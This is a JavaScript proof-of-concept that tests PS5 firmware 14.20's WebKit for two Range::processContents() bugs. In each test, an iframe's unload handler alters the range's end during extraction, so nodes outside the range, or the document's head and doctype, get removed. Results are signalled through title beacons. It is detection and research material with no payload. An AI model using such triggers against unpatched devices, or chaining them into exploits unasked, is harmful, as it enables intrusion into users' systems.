// p492-range-extract-oob.js
//
// PoC: two Range::processContents() bugs that are PRESENT in the WebKit-1200 tree
//       shipped on PS5 14.20, and FIXED upstream in 2026.
//
//   [A] WebKit bug 311700 (fixed 2026-04-08, upstream commit 9dac73538145)
//       "Range.extractContents should not extract out-of-bounds nodes if end
//        container is removed during extraction"
//       Target code: WebCore/dom/Range.cpp:409
//           if (processStart) {          <-- missing the (processEnd || contains) guard
//       Impact: when the end container is removed during the extraction, processEnd
//               becomes null and the loop keeps going, extracting EVERY remaining
//               sibling of the common root -- nodes that were OUTSIDE the range.
//
//   [B] WebKit bug 326459 / rdar://189262302 (fixed 2026-10-07, upstream commit 15f8402bcf9a)
//       "Range::processContents() checks the live end container instead of the
//        saved original end"
//       Target code: WebCore/dom/Range.cpp:372
//           if (&endContainer() != commonRoot && ...)   <-- live, not originalEnd
//       Impact: the common ancestor itself is processed as the end container and
//               processAncestorsAndTheirSiblings() walks up to the document,
//               removing every preceding sibling of every ancestor -- including
//               <head> and the doctype.
//
// Trigger in both cases: an <iframe> that is inside the range.  Removing it during
// the extraction fires a SYNCHRONOUS unload event, and the unload handler mutates
// the range's end container.
//
// Expected on PS5 14.20: P492-BUG311700-HIT and/or P492-BUG326459-HIT
// Expected on patched WebKit: P492-311700-OK / P492-326459-OK

(function () {
    function beacon(s) {
        try { if (window.__beacon) window.__beacon(s); } catch (e) {}
        try { document.title = s; } catch (e) {}
    }

    beacon("P492-START");

    // ---------------------------------------------------------------------
    // [A] bug 311700 -- out-of-bounds extraction (adapted from the upstream
    //     WPT: LayoutTests/imported/w3c/web-platform-tests/dom/ranges/
    //           Range-extractContents-dynamic-end.html)
    // ---------------------------------------------------------------------
    function testOutOfBoundsExtraction() {
        var root = document.getElementById("oob-root");
        if (!root) {
            root = document.createElement("div");
            root.id = "oob-root";
            document.body.appendChild(root);
        }

        var startContainer = document.createElement("div");
        startContainer.id = "oob-startContainer";
        var startNode = document.createElement("span");
        startNode.id = "oob-startNode";
        startNode.textContent = "Start of Range";
        var triggerIframe = document.createElement("iframe");
        triggerIframe.id = "oob-triggerIframe";
        triggerIframe.src = "about:blank";
        triggerIframe.style.display = "none";
        startContainer.appendChild(startNode);
        startContainer.appendChild(triggerIframe);

        var middle = document.createElement("div");
        middle.id = "oob-middle";
        middle.textContent = "Middle elements";

        var endContainer = document.createElement("div");
        endContainer.id = "oob-endContainer";
        var endNode = document.createElement("span");
        endNode.id = "oob-endNode";
        endNode.textContent = "End of Range";
        endContainer.appendChild(endNode);

        var outOfBounds = document.createElement("div");
        outOfBounds.id = "oob-outOfBounds";
        outOfBounds.setAttribute("data-marker", "OUT_OF_BOUNDS");
        outOfBounds.textContent = "Should NOT be extracted";

        root.appendChild(startContainer);
        root.appendChild(middle);
        root.appendChild(endContainer);
        root.appendChild(outOfBounds);

        // The unload handler removes the Range's end container.
        triggerIframe.contentWindow.addEventListener("unload", function () {
            var ec = document.getElementById("oob-endContainer");
            if (ec && ec.parentNode) ec.parentNode.removeChild(ec);
        });

        var range = document.createRange();
        range.setStart(startNode, 0);
        range.setEnd(endNode, 1);

        var fragment = null;
        try {
            fragment = range.extractContents();
        } catch (e) {
            beacon("P492-311700-THREW");
            return;
        }

        var extracted = fragment.querySelector('[data-marker="OUT_OF_BOUNDS"]');
        var stillThere = !!document.getElementById("oob-outOfBounds");

        if (extracted) {
            beacon("P492-BUG311700-HIT");
            beacon("P492-BUG311700-EXTRACTED-OUT-OF-BOUNDS");
        } else {
            beacon("P492-311700-OK");
        }
        if (!stillThere) beacon("P492-BUG311700-OOB-REMOVED-FROM-DOC");
    }

    // ---------------------------------------------------------------------
    // [B] bug 326459 -- <head>/doctype destruction (adapted from the upstream
    //     LayoutTest: fast/dom/Range/
    //       range-end-moved-out-of-common-root-during-iframe-unload.html)
    //     The upstream test uses a same-origin iframe document; here we work
    //     in the top document, where the common root is <body> and the
    //     end boundary starts out at the common ancestor itself.
    // ---------------------------------------------------------------------
    function testHeadDestruction() {
        var host = document.getElementById("hd-host");
        if (!host) {
            host = document.createElement("div");
            host.id = "hd-host";
            document.body.appendChild(host);
        }

        var inner = document.createElement("div");
        inner.id = "hd-root";
        var a = document.createElement("div");
        a.id = "hd-a";
        var b = document.createElement("p");
        b.id = "hd-b";
        b.textContent = "def";
        inner.appendChild(a);
        inner.appendChild(b);

        var before = document.createElement("div");
        before.id = "hd-before";
        before.textContent = "before";
        var after = document.createElement("div");
        after.id = "hd-after";
        after.textContent = "after";

        host.appendChild(before);
        host.appendChild(inner);
        host.appendChild(after);

        // an iframe inside the range; removing it fires a synchronous unload
        var trigger = document.createElement("iframe");
        trigger.src = "about:blank";
        trigger.style.display = "none";
        a.appendChild(trigger);

        var range = document.createRange();
        range.setStart(a, 0);
        range.setEnd(host, 2);           // end == the common ancestor itself

        trigger.contentWindow.addEventListener("unload", function () {
            // move the range end into a descendant of the common root
            try { range.setEnd(b.firstChild, 1); } catch (e) {}
        });

        try {
            range.deleteContents();
        } catch (e) {
            beacon("P492-326459-THREW");
            return;
        }

        // The bug removes nodes that are outside the common ancestor's subtree.
        var beforeParent = document.getElementById("hd-before");
        var afterParent = document.getElementById("hd-after");
        var innerParent = document.getElementById("hd-root");

        if (!beforeParent || !afterParent || !innerParent) {
            beacon("P492-BUG326459-HIT");
            beacon("P492-BUG326459-NODES-OUTSIDE-COMMON-ROOT-REMOVED");
        } else {
            beacon("P492-326459-OK");
        }
        if (!document.head) beacon("P492-BUG326459-HEAD-GONE");
        if (!document.doctype) beacon("P492-BUG326459-DOCTYPE-GONE");
    }

    try { testOutOfBoundsExtraction(); } catch (e) { beacon("P492-A-ERROR"); }
    try { testHeadDestruction(); } catch (e) { beacon("P492-B-ERROR"); }

    beacon("P492-DONE");
})();
